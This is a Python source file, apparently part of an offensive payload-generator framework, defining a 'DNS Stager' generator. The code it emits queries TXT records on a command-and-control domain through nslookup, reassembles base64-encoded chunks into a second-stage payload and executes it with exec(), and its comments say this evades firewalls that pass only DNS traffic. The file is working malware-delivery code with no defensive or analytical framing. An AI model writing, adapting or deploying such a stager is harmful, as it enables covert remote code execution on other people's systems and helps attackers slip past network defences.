# dns tunneling stager
# pulls second-stage payload via dns txt record lookups
# this bypasses firewalls that only allow dns traffic

from generators.base import BaseGenerator


class DNSStagerGenerator(BaseGenerator):
    LANG_ID = "dns"
    LANG_NAME = "DNS Stager"
    FILE_EXT = ".py"

    def generate(self, host, port, opts, ptype, tpl, adv):
        # the host field is used as the dns domain to query
        # the port is ignored for dns, but we keep the signature consistent
        domain = host

        code = (
            "import subprocess, base64, sys, os\n\n"
            "# dns tunneling stager\n"
            "# pulls encoded commands from txt records on the c2 domain\n"
            "# each chunk is a separate subdomain query\n\n"
            f"domain = '{domain}'\n\n"
            "def dns_fetch(sub):\n"
            "    \"\"\"query a txt record and return the decoded value\"\"\"\n"
            "    try:\n"
            "        out = subprocess.getoutput(f'nslookup -type=txt {sub}.{domain}')\n"
            "        for line in out.splitlines():\n"
            "            if '\"' in line:\n"
            "                return line.split('\"')[1]\n"
            "    except: pass\n"
            "    return ''\n\n"
            "# fetch the stage count from the control record\n"
            "count = int(dns_fetch('chunks') or '0')\n"
            "if count == 0:\n"
            "    sys.exit(0)\n\n"
            "# reassemble the payload from sequential chunk records\n"
            "payload = ''\n"
            "for i in range(count):\n"
            "    payload += dns_fetch(f'c{i}')\n\n"
            "# decode and execute the reassembled stage\n"
            "try:\n"
            "    exec(base64.b64decode(payload).decode())\n"
            "except Exception as e:\n"
            "    pass\n"
        )
        return code
